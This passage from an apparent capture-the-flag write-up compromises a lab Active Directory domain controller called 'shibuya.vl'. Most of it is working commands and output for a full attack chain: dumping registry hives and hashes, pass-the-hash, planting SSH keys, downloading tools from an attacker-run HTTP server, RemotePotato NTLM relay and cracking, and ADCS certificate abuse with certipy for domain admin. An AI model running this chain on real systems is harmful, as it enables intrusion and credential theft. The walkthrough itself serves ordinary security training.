getting file \vss-meta.cab of size 365686 as vss-meta.cab (426.7 KiloBytes/sec) (average 753.3 KiloBytes/sec)  
smb: \> exit
```

We got the full `01.wim` but :

```bash
parallel_read returned NT_STATUS_IO_TIMEOUT  
parallel_read returned NT_STATUS_IO_TIMEOUT  
getting file \AWSJPWK0222-02.wim of size 50660968 as AWSJPWK0222-02.wim getting file \AWSJPWK0222-03.wim of size 32065850 as AWSJPWK0222-03.wim getting file \vss-meta.cab of size 365686 as vss-meta.cab (680.2 K  
iloBytes/sec) (average 639.2 KiloBytes/sec)  
total 33M  
-rw-r--r-- 1 vagabond vagabond 7.9M Jun  9 18:27 AWSJPWK0222-01.wim  
-rw-r--r-- 1 vagabond vagabond    0 Jun  9 18:27 AWSJPWK0222-02.wim  
-rw-r--r-- 1 vagabond vagabond  24M Jun  9 18:28 AWSJPWK0222-03.wim  
-rw-r--r-- 1 vagabond vagabond 358K Jun  9 18:29 vss-meta.cab
```

Only a part of `02` and `03`.

```bash
>  sudo mkdir -p /mnt/shibuya-wim
  
>  sudo wimmount /tmp/shibuya-images/AWSJPWK0222-02.wim /mnt/shibuya-wim  
>  find /mnt/shibuya-wim -maxdepth 4 -iname 'SAM' -o -iname 'SYSTEM' -o -iname 'SECURITY' 2>/dev/null

[ERROR] "/tmp/shibuya-images/AWSJPWK0222-02.wim": Error reading header: Invalid argument  
ERROR: Exiting with error code 65:  
      Unexpectedly reached the end of the file.
```

The file being incomplete, it can't be mounted, and we found nothing on `01`.

We try redownloading `02` :

```bash
>  cd /tmp/shibuya-images  
smbclient //shibuya.vl/images$ -U 'shibuya.vl/svc_autojoin%K5&A6Dw9d8jrKWhV' -t 1200 -c 'prompt off; recurse off; get AWSJPWK0222-02.wim AWSJPWK0222-02.wim'  
getting file \AWSJPWK0222-02.wim of size 50660968 as AWSJPWK0222-02.wim (889.3 KiloBytes/sec) (average 889.3 KiloBytes/sec)
>  smbclient //shibuya.vl/images$ -U 'shibuya.vl/svc_autojoin%K5&A6Dw9d8jrKWhV' -t 1200 -c 'prompt off; get AWSJPWK0222-03.wim AWSJPWK0222-03.wim'  
  
getting file \AWSJPWK0222-03.wim of size 32065850 as AWSJPWK0222-03.wim (964.4 KiloBytes/sec) (average 964.4 KiloBytes/sec)
```

Looks like we got it this time.

Since we found nothing on `01` :

```bash
>  sudo wimunmount /mnt/shibuya-wim  
sudo wimmount /tmp/shibuya-images/AWSJPWK0222-02.wim /mnt/shibuya-wim  
>  sudo find /mnt/shibuya-wim -maxdepth 4 -iname 'SAM' -o -iname 'SYSTEM' -o -iname 'SECURITY' 2>/dev/null  
  
/mnt/shibuya-wim/RegBack/SAM  
/mnt/shibuya-wim/RegBack/SECURITY  
/mnt/shibuya-wim/RegBack/SYSTEM  
/mnt/shibuya-wim/SAM  
/mnt/shibuya-wim/SECURITY  
/mnt/shibuya-wim/SYSTEM
```

We found `SAM`, `SECURITY` and `SYSTEM` on `02`.

```bash
>  sudo ls -lh /mnt/shibuya-wim/SYSTEM /mnt/shibuya-wim/SAM /mnt/shibuya-wim/SECURITY  
  
-rwxrwxrwx 1 root root 64K Feb 16  2025 /mnt/shibuya-wim/SAM  
-rwxrwxrwx 1 root root 32K Feb 16  2025 /mnt/shibuya-wim/SECURITY  
-rwxrwxrwx 1 root root 17M Feb 16  2025 /mnt/shibuya-wim/SYSTEM
```

They are mounted as `root`.

We need to make it `ours` so we can actually access them as they are `READ ONLY` as `root` :

```bash
>  mkdir -p /tmp/shibuya-hives  
sudo cp /mnt/shibuya-wim/SYSTEM /mnt/shibuya-wim/SAM /mnt/shibuya-wim/SECURITY /tmp/shibuya-hives/  
sudo chown "$USER":"$USER" /tmp/shibuya-hives/*  
ls -lh /tmp/shibuya-hives/  
total 17M  
-rwxr-xr-x 1 vagabond vagabond 64K Jun  9 18:55 SAM  
-rwxr-xr-x 1 vagabond vagabond 32K Jun  9 18:55 SECURITY  
-rwxr-xr-x 1 vagabond vagabond 17M Jun  9 18:55 SYSTEM
```

```bash
>  secretsdump.py -system /tmp/shibuya-hives/SYSTEM -sam /tmp/shibuya-hives/SAM -security /tmp/shibuya-hives/SECURITY LOCAL  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::  
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::  
[*] Dumping cached domain logon information (domain/username:hash)  
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)  
[*] Dumping LSA Secrets  
[*] $MACHINE.ACC    
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b  
0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e00  
6d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900  
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42  
[*] DPAPI_SYSTEM    
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1  
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06  
[*] NL$KM    
0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f  
0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.  
0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.  
0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...  
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97  
[*] Cleaning up.
```

And we got a bunch of `LM:NT hashes`, a `Machine password in hex` and some `keys`.

`Administrator`'s `NT` hash probably won't work since we don't have foothold yet.

`Dumping cached domain logon information  SHIBUYA.VL/Simon.Watson` tells us this is a `shadow copy`  from `Simon.Watson`'s computer.

The hash we're interested in is `operator` since `the local user's (RID)` is `:1000` :

`operator`'s `hash` : `5d8c3d1a20bd63f60f469f6763ca0d50`.

We also got the `local Administrator`'s hash : `8dcb5ed323d1d09b9653452027e8c013`.

We'll try `Pass-The-Hash` on `operator` with `netexec` :

```bash
>  nxc smb shibuya.vl -u simon.watson -H 5d8c3d1a20bd63f60f469f6763ca0d50 --shares  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50    
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares  
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark  
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------  
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin  
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share  
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ               
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC  
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share    
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share    
SMB         10.129.234.42   445    AWSJPDC0522      users           READ

>  nxc winrm shibuya.vl -u simon.watson -H 5d8c3d1a20bd63f60f469f6763ca0d50
```

For some reason, `nxc winrm` didn't respond with an error, it just responded with nothing.

We'll try `Impacket` :

```bash
>  psexec.py Simon.Watson@10.129.234.42 -hashes :5d8c3d1a20bd63f60f469f6763ca0d50  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Requesting shares on 10.129.234.42.....  
[-] share 'ADMIN$' is not writable.  
[-] share 'C$' is not writable.  
[-] share 'images$' is not writable.  
[-] share 'NETLOGON' is not writable.  
[-] share 'SYSVOL' is not writable.  
[-] share 'users' is not writable.
```

```bash
>  smbclient.py shibuya.vl/simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50  
  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
Type help for list of commands  
# use users  
# cd simon.watson  
# ls  
drw-rw-rw-          0  Tue Feb 18 20:36:45 2025 .  
drw-rw-rw-          0  Sun Feb 16 11:50:59 2025 ..  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 AppData  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Application Data  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Cookies  
drw-rw-rw-          0  Wed Apr  9 02:06:32 2025 Desktop  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Documents  
drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Downloads  
drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Favorites  
drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Links  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Local Settings  
drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Music  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 My Documents  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 NetHood  
-rw-rw-rw-     262144  Sun Feb 16 11:42:05 2025 NTUSER.DAT  
-rw-rw-rw-          0  Sun Feb 16 11:42:05 2025 ntuser.dat.LOG1  
-rw-rw-rw-          0  Sun Feb 16 11:42:05 2025 ntuser.dat.LOG2  
-rw-rw-rw-      65536  Sun Feb 16 11:42:08 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf  
-rw-rw-rw-     524288  Sun Feb 16 11:42:05 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms  
-rw-rw-rw-     524288  Sun Feb 16 11:42:05 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms  
-rw-rw-rw-         20  Tue Feb 18 20:30:58 2025 ntuser.ini  
drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Pictures  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 PrintHood  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Recent  
drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Saved Games  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 SendTo  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Start Menu  
drw-rw-rw-          0  Sun Feb 16 11:42:06 2025 Templates  
drw-rw-rw-          0  Sun Feb 16 11:42:05 2025 Videos  
# cd Desktop  
# ls  
drw-rw-rw-          0  Wed Apr  9 02:06:32 2025 .  
drw-rw-rw-          0  Tue Feb 18 20:36:45 2025 ..  
-rw-rw-rw-         32  Wed Apr  9 02:06:45 2025 user.txt  
# cat user.txt  
735315****************8efc261
```

We got the user flag.

Then, we'll try the local `Administrator` :

```bash
>  nxc smb shibuya.vl -u Administrator -H 8dcb5ed323d1d09b9653452027e8c013 --shares  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.42   445    AWSJPDC0522      [-] shibuya.vl\Administrator:8dcb5ed323d1d09b9653452027e8c013 STATUS_LOGON_FAILURE
```

And it fails, obviously.

We'll create a `ssh key` and copy the `public key` in the `authorized keys` via `simon.watson`'s `hash` : 

```bash
>  ssh-keygen -t ed25519 -f /tmp/simonssh -N ""  
  
Generating public/private ed25519 key pair.  
Your identification has been saved in /tmp/simonssh  
Your public key has been saved in /tmp/simonssh.pub  
The key fingerprint is:  
SHA256:o16BUhxOpE7mG/5SS9Eu95MhYxZ4XXNzAJ+3pHkM2GQ vagabond@blackarch  
The key's randomart image is:  
+--[ED25519 256]--+  
|     .+     .E.. |  
|     = .    B.o..|  
|    + +o . o =o+.|  
|   = .o.+ .   *..|  
|    = .+S.   o + |  
|   . ++.Bo.   .  |  
|    oo.*.+ o     |  
|    .o..  +      |  
|     .o    .     |  
+----[SHA256]-----+
```

```bash
>  cp /tmp/simonssh.pub /tmp/authorized_keys  
>  smbclient.py shibuya.vl/simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50  
  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
Type help for list of commands  
# use users  
# cd simon.watson  
# mkdir .ssh  
# cd .ssh  
# put /tmp/authorized_keys  
# exit
```

```bash
>  ssh -i /tmp/simonssh -o StrictHostKeyChecking=no simon.watson@10.129.234.42 whoami  
  
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
shibuya\simon.watson
```

And we get in :
```bash
> ssh -i /tmp/simonssh -o StrictHostKeyChecking=no simon.watson@10.129.234.42
```

```PowerShell

shibuya\simon.watson@AWSJPDC0522 C:\Users>whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State     
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  
shibuya\simon.watson@AWSJPDC0522 C:\Users>whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID                                         Attributes  
=========================================== ================ =========================================== ==================================================  
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group  
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group  
SHIBUYA\shibuya                             Group            S-1-5-21-87560095-894484815-3652015022-1108 Mandatory group, Enabled by default, Enabled group  
SHIBUYA\ssh                                 Group            S-1-5-21-87560095-894484815-3652015022-3101 Mandatory group, Enabled by default, Enabled group  
SHIBUYA\t2_admins                           Group            S-1-5-21-87560095-894484815-3652015022-1104 Mandatory group, Enabled by default, Enabled group  
Service asserted identity                   Well-known group S-1-18-2                                    Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
```

We use `PowerShell` to verify the `tasklist` :

```PowerShell
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>powershell -Command "Get-Process explorer,certsrv -ErrorAction SilentlyContinue | Format-Table Name,Id,SessionId -AutoSize"  
  
Name       Id SessionId  
----       -- ---------  
certsrv  3064         0  
explorer 5544         1
```

Then, we get `remote Potato` and use `python` to create a `http server` :

```bash
>  cd /tmp/shibuya-tools  
wget -q https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip  
unzip -o RemotePotato0.zip  
wget -q https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip  
unzip -o RunasCs.zip  
ls -lh *.exe  
python3 -m http.server 8080  
Archive:  RemotePotato0.zip  
 inflating: RemotePotato0.exe          
Archive:  RunasCs.zip  
 inflating: RunasCs.exe                
 inflating: RunasCs_net2.exe           
-rw-r--r-- 1 vagabond vagabond 173K Aug  6  2021 RemotePotato0.exe  
-rw-r--r-- 1 vagabond vagabond  51K May 20  2023 RunasCs.exe  
-rw-r--r-- 1 vagabond vagabond  60K May 17  2023 RunasCs_net2.exe  
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Then, on the shell :

```bash
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson\Music>powershell -Command "Invoke-WebRequest http://10.10.14.228:8080/RunasCs.exe -OutFile run.exe"  
  
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson\Music>powershell -Command "Invoke-WebRequest http://10.10.14.228:8080/RemotePotato0.exe -OutFile potato.exe"  
  
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson\Music>dir run.exe potato.exe  
Volume in drive C has no label.  
Volume Serial Number is 46FF-CF3D  
  
Directory of C:\Users\simon.watson\Music  
  
06/09/2026  11:15 AM            51,712 run.exe  
  
Directory of C:\Users\simon.watson\Music  
  
06/09/2026  11:16 AM           176,640 potato.exe  
              2 File(s)        228,352 bytes  
              0 Dir(s)   6,371,696,640 bytes free
```

And we got `200` on the `http-server` meaning everything ran smoothly :

```bash
10.129.234.42 - - [09/Jun/2026 20:15:38] "GET /RunasCs.exe HTTP/1.1" 200 -  
10.129.234.42 - - [09/Jun/2026 20:16:05] "GET /RemotePotato0.exe HTTP/1.1" 200 -
```

We open a `socat` listener on `port 8889` :

```bash
>  sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8889
```

And execute `potato` on the shell to respond to that port :

```bash
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson\Music>.\potato.exe -m 2 -r 10.10.14.228 -x 10.10.14.228 -p 8889 -s 1                                                      
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.14.228 to your victim machine on port 8889  
[*] Example Network redirector:  
       sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8889  
[*] Starting the RPC server to capture the credentials hash from the user authentication!!  
[*] RPC relay server listening on port 9997 ...  
[*] Spawning COM object in the session: 1  
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}  
[*] Starting RogueOxidResolver RPC Server listening on port 8889 ...    
[*] IStoragetrigger written: 106 bytes  
[*] ServerAlive2 RPC Call  
[*] ResolveOxid2 RPC call  
[+] Received the relayed authentication on the RPC relay server on port 9997  
[*] Connected to RPC Server 127.0.0.1 on port 8889  
[+] User hash stolen!  
  
NTLMv2 Client   : AWSJPDC0522  
NTLMv2 Username : SHIBUYA\Nigel.Mills  
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:f7a6e2ffb41ce0c9:c169bcff4d7f2dc5f3e87ef0edb1eabe:010100000000000043de9c033ef8dc0148b9394fae378f9e0000000002000e005300480049004200550059004100010016004100570053004a0050004  
400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e00760  
06c000700080043de9c033ef8dc01060004000600000008003000300000000000000001000000002000002439f960663e8704cdc13caca36a4ba31464f15a630deccdbfac2ae1f3a5788a0a00100000000000000000000000000000000000090000000000000000000  
000
```

We got `Nigel.mills` and a `NTLMv2` hash.

We crack it with `john` :

```bash
>  nano /tmp/nigel.hash  
>  john /tmp/nigel.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"  
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 8 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Sail2Boat3       (Nigel.Mills)  
1g 0:00:00:00 DONE (2026-06-09 20:35) 9.090g/s 2085Kp/s 2085Kc/s 2085KC/s asswipe!..170176  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed
>  john --show /tmp/nigel.hash  
Nigel.Mills:Sail2Boat3:SHIBUYA:f7a6e2ffb41ce0c9:c169bcff4d7f2dc5f3e87ef0edb1eabe:010100000000000043de9c033ef8dc0148b9394fae378f9e0000000002000e005300480049004200550059004100010016004100570053004a005000440043003  
0003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c00070  
0080043de9c033ef8dc01060004000600000008003000300000000000000001000000002000002439f960663e8704cdc13caca36a4ba31464f15a630deccdbfac2ae1f3a5788a0a00100000000000000000000000000000000000090000000000000000000000
```

`Nigel.Mills:Sail2Boat3`

```bash
>  nxc smb shibuya.vl -u Nigel.Mills -p 'Sail2Boat3' --shares  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Nigel.Mills:Sail2Boat3    
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares  
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark  
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------  
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin  
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share  
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ,WRITE         
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC  
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share    
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share    
SMB         10.129.234.42   445    AWSJPDC0522      users           READ
```

We have `READ, WRITE` on `images$`

We request a certificate via `RPC` directly via our VPN :

```bash
>  certipy req -u Nigel.Mills@shibuya.vl -p 'Sail2Boat3' -dc-ip 10.129.234.42 -target-ip 10.129.234.42 -target shibuya.vl -ca 'shibuya-AWSJPDC0522-CA' -template ShibuyaWeb -upn _admin -sid S-1-5-21-87560095-894  
484815-3652015022-500 -key-size 4096 -dc-host AWSJPDC0522.shibuya.vl -timeout 120  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 5  
[*] Successfully requested certificate  
[*] Got certificate with UPN '_admin'  
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'  
[*] Saving certificate and private key to '_admin.pfx'  
[*] Wrote certificate and private key to '_admin.pfx'
```

Then, we request the `_admin`'s hash :

```bash
>  certipy auth -pfx _admin.pfx -domain shibuya.vl -dc-ip 10.129.234.42  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: '_admin'  
[*]     SAN URL SID: 'S-1-5-21-87560095-894484815-3652015022-500'  
[*]     Security Extension SID: 'S-1-5-21-87560095-894484815-3652015022-500'  
[*] Using principal: '_admin@shibuya.vl'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to '_admin.ccache'  
[*] Wrote credential cache to '_admin.ccache'  
[*] Trying to retrieve NT hash for '_admin'  
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```

Then we execute via `netexec` on SMB `type` to get the root flag.

```bash
>  nxc smb shibuya.vl -u _admin -H bab5b2a004eabb11d865f31912b6b430 -x "type C:\Users\Administrator\Desktop\root.txt"  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\_admin:bab5b2a004eabb11d865f31912b6b430 (Pwn3d!)  
SMB         10.129.234.42   445    AWSJPDC0522      [+] Executed command via wmiexec  
SMB         10.129.234.42   445    AWSJPDC0522      5b150************************8f1
```

And we got root.
